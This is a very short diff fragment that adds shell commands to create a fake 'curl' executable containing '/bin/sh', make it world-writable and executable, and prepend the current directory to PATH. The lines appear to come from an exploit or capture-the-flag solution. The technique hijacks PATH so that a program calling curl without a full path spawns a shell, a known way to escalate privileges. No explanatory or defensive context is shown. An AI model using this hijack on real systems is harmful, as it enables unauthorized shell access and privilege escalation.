@@ -1,0 +1,4 @@
+
+    echo /bin/sh > curl
+    chmod 777 curl
+    export PATH=.:$PATH
